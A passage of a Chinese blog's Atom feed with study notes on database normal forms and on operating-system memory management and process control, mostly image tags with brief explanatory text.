        <content type="html"><![CDATA[<h1 id="数据库设计三大范式"><a href="#数据库设计三大范式" class="headerlink" title="数据库设计三大范式"></a>数据库设计三大范式</h1><h2 id="第一范式"><a href="#第一范式" class="headerlink" title="第一范式"></a>第一范式</h2><p>要求有主键，并且要求每一个字段的原子性不可再分 </p><img src="/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/image-20210630203857263.png" class="lazyload" data-srcset="/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/image-20210630203857263.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210630203857263" style="zoom:50%;"><p><strong>最后一条记录和第一条重复，不唯一，没有主键，联系方式可以再分，不满足第一范式</strong></p><h2 id="第二范式"><a href="#第二范式" class="headerlink" title="第二范式"></a>第二范式</h2><p>要求所有非主键字段完全依赖主键，不能产生部分依赖</p><h2 id="第三范式"><a href="#第三范式" class="headerlink" title="第三范式"></a>第三范式</h2><p>所有非主键字段和主键字段之间不能产生传递依赖</p><img src="/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/image-20210630210400437.png" class="lazyload" data-srcset="/2021/06/30/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%AE%BA/image-20210630210400437.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210630210400437" style="zoom:50%;"><p><strong>班级字段存在冗余，班级名称字段没有直接依赖主键，班级名称字段依赖班级编号，班级编号依赖于学生编号，这就是传递依赖，解决办法就是将冗余字段单独拿出来建立表</strong></p><h2 id="经典设计"><a href="#经典设计" class="headerlink" title="经典设计"></a>经典设计</h2><p>一对一：</p><p>一对多：一存储在一张表中，多存储在一张表中，在多的那张表中添加外键指向一的那张表</p><p>多对多：</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>操作系统复习-3</title>
      <link href="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/"/>
      <url>/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/</url>
      
        <content type="html"><![CDATA[<img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627162933070.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627162933070.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627162933070"><h1 id="程序装入内存"><a href="#程序装入内存" class="headerlink" title="程序装入内存"></a>程序装入内存</h1><p>绝对装入、静态重定位（可重定位）地址变换是在装入时一次完成的、动态重定位：把地址推迟到程序真正执行时才进行，装入内存后所有的地址仍然是逻辑地址</p><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164347826.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164347826.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627164347826" style="zoom:67%;"><h1 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h1><h2 id="操作系统负责内存空间的分配和回收"><a href="#操作系统负责内存空间的分配和回收" class="headerlink" title="操作系统负责内存空间的分配和回收"></a>操作系统负责内存空间的分配和回收</h2><h2 id="从逻辑上对内存空间进行扩充"><a href="#从逻辑上对内存空间进行扩充" class="headerlink" title="从逻辑上对内存空间进行扩充"></a>从逻辑上对内存空间进行扩充</h2><h6 id="1-覆盖技术"><a href="#1-覆盖技术" class="headerlink" title="1.覆盖技术"></a>1.覆盖技术</h6><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165214050.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165214050.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627165214050" style="zoom:50%;"><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165317098.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165317098.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627165317098" style="zoom:50%;"><h6 id="2-交换技术"><a href="#2-交换技术" class="headerlink" title="2.交换技术"></a>2.交换技术</h6><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165404498.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627165404498.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627165404498" style="zoom:50%;"><h6 id="3-虚拟存储技术"><a href="#3-虚拟存储技术" class="headerlink" title="3.虚拟存储技术"></a>3.虚拟存储技术</h6><h2 id="提供地址转换功能，负责程序的逻辑地址与物理地址的转换"><a href="#提供地址转换功能，负责程序的逻辑地址与物理地址的转换" class="headerlink" title="提供地址转换功能，负责程序的逻辑地址与物理地址的转换"></a>提供地址转换功能，负责程序的逻辑地址与物理地址的转换</h2><p><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164655053.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164655053.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627164655053"></p><h2 id="提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰"><a href="#提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰" class="headerlink" title="提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰"></a>提供内存保护功能，保证各进程在各自存储空间内运行，互不干扰</h2><p>1.设置上下限寄存器</p><p>2.利用重定位寄存器、界地址寄存器进行判断</p><p><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164852496.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164852496.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627164852496" style="zoom:50%;"><img src="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164959573.png" class="lazyload" data-srcset="/2021/06/27/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-3/image-20210627164959573.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210627164959573" style="zoom:50%;"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统复习-2</title>
      <link href="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/"/>
      <url>/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<h1 id="进程的概念、组成、特征"><a href="#进程的概念、组成、特征" class="headerlink" title="进程的概念、组成、特征"></a>进程的概念、组成、特征</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155626420.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155626420.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620155626420" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155852712.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155852712.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620155852712"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155915980.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155915980.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620155915980" style="zoom:50%;"><h2 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155940282.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620155940282.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620155940282" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160053329.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160053329.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620160053329"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160306210.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160306210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620160306210" style="zoom:50%;"><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160404760.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620160404760.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620160404760" style="zoom:50%;"><h1 id="进程状态与转换"><a href="#进程状态与转换" class="headerlink" title="进程状态与转换"></a>进程状态与转换</h1><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161024607.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161024607.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161024607" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161040447.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161040447.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161040447"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161109048.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161109048.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161109048" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161208523.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161208523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161208523" style="zoom: 33%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161220881.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161220881.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161220881"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161208523.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161208523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161208523" style="zoom: 33%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161220881.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161220881.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161220881" style="zoom: 33%;"></p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161238842.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-2/image-20210620161238842.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620161238842" style="zoom:33%;"><h1 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h1><p>实现进程状态转换</p><h2 id="实现进程控制（原语）"><a href="#实现进程控制（原语）" class="headerlink" title="实现进程控制（原语）"></a>实现进程控制（原语）</h2><h2 id="原语的原子性"><a href="#原语的原子性" class="headerlink" title="原语的原子性"></a>原语的原子性</h2><p>原语的执行具有原子性，即执行的过程只能一气呵成，期间不允许被中断。</p><p><strong>通过使用“关中断”和“开中断”这两个特权指令实现原子性</strong></p><h2 id="进程控制相关的原语"><a href="#进程控制相关的原语" class="headerlink" title="进程控制相关的原语"></a>进程控制相关的原语</h2><h3 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h3><h6 id="1-创建原语"><a href="#1-创建原语" class="headerlink" title="1.创建原语"></a>1.创建原语</h6><ul><li><p>申请空白PCB</p></li><li><p>为新进程分配所需资源</p></li><li><p>初始化PCB</p></li><li><p>将PCB插入就绪队列：创建态-&gt;就绪态</p></li></ul><h6 id="2-引起进程创建的事件"><a href="#2-引起进程创建的事件" class="headerlink" title="2.引起进程创建的事件"></a>2.引起进程创建的事件</h6><ul><li><p>用户登录</p></li><li><p>作业调度</p><p><strong>多道批处理系统中，有新的作业放入内存中，会为其创建一个新的进程</strong></p></li><li><p>提供服务</p></li><li><p>应用请求</p></li></ul><h3 id="进程的终止"><a href="#进程的终止" class="headerlink" title="进程的终止"></a>进程的终止</h3><h6 id="1-撤销原语"><a href="#1-撤销原语" class="headerlink" title="1.撤销原语"></a>1.撤销原语</h6><ul><li><p>从PCB集合中找到终止进程的PCB</p></li><li><p>若进程正在运行，立即剥夺CPU，将CPU分配给其他进程</p></li><li><p>终止其所有的子进程</p></li><li><p>将该进程拥有的所有资源归还给父进程或操作系统</p></li><li><p>删除PCB</p></li></ul><h6 id="2-引起进程终止事件"><a href="#2-引起进程终止事件" class="headerlink" title="2.引起进程终止事件"></a>2.引起进程终止事件</h6><ul><li>正常结束(exit 系统调用)</li><li>异常结束（除0操作）</li><li>外界干预</li></ul><h3 id="进程的阻塞和唤醒"><a href="#进程的阻塞和唤醒" class="headerlink" title="进程的阻塞和唤醒"></a>进程的阻塞和唤醒</h3><img 